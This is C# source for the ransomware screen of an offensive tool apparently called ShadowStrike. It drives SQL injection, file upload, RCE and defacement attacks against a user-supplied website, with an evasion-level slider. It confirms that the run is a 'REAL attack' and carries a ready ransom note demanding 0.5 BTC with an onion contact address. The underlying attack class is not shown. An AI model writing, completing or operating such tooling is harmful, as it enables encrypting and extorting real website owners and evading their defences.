using System;
using System.Windows;
using System.Windows.Controls;
using ShadowStrike.Core;
using ShadowStrike.UI;

namespace ShadowStrike.UI.Views
{
    public partial class RansomwareView : UserControl
    {
        private WebRansomwareAttacker _attacker;
        private bool _isAttacking;

        public RansomwareView()
        {
            try
            {
                InitializeComponent();
                _attacker = new WebRansomwareAttacker();
                _attacker.LogEvent += OnLogReceived;
                
                // Update evasion level text when slider changes
                EvasionSlider.ValueChanged += (s, e) =>
                {
                    string[] levels = { "None", "Low", "Medium", "Maximum" };
                    EvasionLevelText.Text = levels[(int)EvasionSlider.Value];
                };
                


                // Auto-fill from AppState
                var appState = AppState.Load();
                if (!string.IsNullOrEmpty(appState.TargetUrl))
                {
                    TargetUrlBox.Text = appState.TargetUrl;
                }

                // Refresh target URL when view is loaded
                this.Loaded += (s, e) =>
                {
                    var state = AppState.Load();
                    if (!string.IsNullOrEmpty(state.TargetUrl))
                    {
                        TargetUrlBox.Text = state.TargetUrl;
                    }
                };
            }
            catch (Exception ex)
            {
                CustomMessageBox.Show($"Error loading Ransomware View: {ex.Message}\n\nStack Trace:\n{ex.StackTrace}", 
                    "Ransomware View Error", MessageBoxButton.OK, MessageBoxImage.Error);
                throw;
            }
        }



        private async void ExecuteButton_Click(object sender, RoutedEventArgs e)
        {
            if (_isAttacking) return;

            var state = AppState.Load();
            if (!state.IsScanCompleted)
            {
                CustomMessageBox.Show("Please scan a target in the Dashboard first to identify vulnerabilities and open ports.", "Scan Required", MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            
            string targetUrl = TargetUrlBox.Text.Trim();
            if (string.IsNullOrEmpty(targetUrl))
            {
                CustomMessageBox.Show("Please enter a target URL.", "No Target", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }
            
            if (!targetUrl.StartsWith("http://") && !targetUrl.StartsWith("https://"))
            {
                targetUrl = "https://" + targetUrl;
                TargetUrlBox.Text = targetUrl;
            }
            
            int attackVector = AttackVectorComboBox.SelectedIndex;
            int evasionLevel = (int)EvasionSlider.Value;

            string ransomNote = @"ATTENTION: Your Website Has Been Encrypted
All your website files and databases have been encrypted using military-grade AES-256 encryption.
To recover your data, you must obtain the decryption key from us.
PAYMENT INSTRUCTIONS:
1. Purchase 0.5 BTC worth of Bitcoin
2. Send to: {BTC_ADDRESS}
3. Email your unique ID to: recovery@secure-decrypt.onion
Your Unique ID: {VICTIM_ID}";
            
            string vectorName = attackVector switch
            {
                0 => "SQL Injection",
                1 => "File Upload",
                2 => "RCE",
                3 => "Defacement",
                4 => "All Vectors",
                _ => "Unknown"
            };
            
            string message = $"Initiating Web Ransomware Attack\n\n" +
                           $"Target: {targetUrl}\n" +
                           $"Attack Vector: {vectorName}\n" +
                           $"Evasion Level: {evasionLevel}/3\n" +
                           $"Max Delay: {DelaySlider.Value}s\n\n" +
                           $"This will perform a REAL attack. Proceed?";
            
            var result = CustomMessageBox.Show(message, "Confirm Attack", MessageBoxButton.YesNo, MessageBoxImage.Warning);
            
            if (result)
            {
                _isAttacking = true;
                ExecuteButton.IsEnabled = false;
                StopButton.IsEnabled = true;
                StatusText.Text = "ATTACKING";
                StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 68, 68));
                
                LogOutput.AppendText($"[ATTACK INITIATED] Target: {targetUrl}\n");
                LogOutput.AppendText($"[CONFIG] Vector: {vectorName}, Evasion: {evasionLevel}/3\n");
                
                try
                {
                    if (attackVector == 0 || attackVector == 4)
                    {
                        CurrentVectorText.Text = "SQL Injection";
                        await _attacker.ExecuteSqlInjectionAttack(targetUrl, ransomNote, evasionLevel);
                    }
                    
                    if (attackVector == 1 || attackVector == 4)
                    {
                        CurrentVectorText.Text = "File Upload";
                        await _attacker.ExecuteFileUploadAttack(targetUrl, ransomNote, evasionLevel);
                    }
                    
                    if (attackVector == 2 || attackVector == 4)
                    {
                        CurrentVectorText.Text = "RCE";
                        await _attacker.ExecuteRceAttack(targetUrl, ransomNote, evasionLevel);
                    }
                    
                    if (attackVector == 3 || attackVector == 4)
                    {
                        CurrentVectorText.Text = "Defacement";
                        await _attacker.ExecuteDefacementAttack(targetUrl, ransomNote, evasionLevel);
                    }
                    
                    StatusText.Text = "COMPLETED";
                    StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0, 255, 136));
                    CurrentVectorText.Text = "Attack Finished";
                }
                catch (Exception ex)
                {
                    LogOutput.AppendText($"[ERROR] {ex.Message}\n");
                    StatusText.Text = "FAILED";
                    StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 68, 68));
                }
                finally
                {
                    _isAttacking = false;
                    ExecuteButton.IsEnabled = true;
                    StopButton.IsEnabled = false;
                }
            }
        }

        private void StopButton_Click(object sender, RoutedEventArgs e)
        {
            _isAttacking = false;
            StatusText.Text = "STOPPED";
            StatusText.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(255, 170, 0));
            ExecuteButton.IsEnabled = true;
            StopButton.IsEnabled = false;
            LogOutput.AppendText("[ATTACK STOPPED BY USER]\n");
        }

        private void OnLogReceived(object sender, string message)
        {
            Dispatcher.Invoke(() =>
            {
                LogOutput.AppendText(message + "\n");
                LogOutput.ScrollToEnd();
            });
        }
    }
}
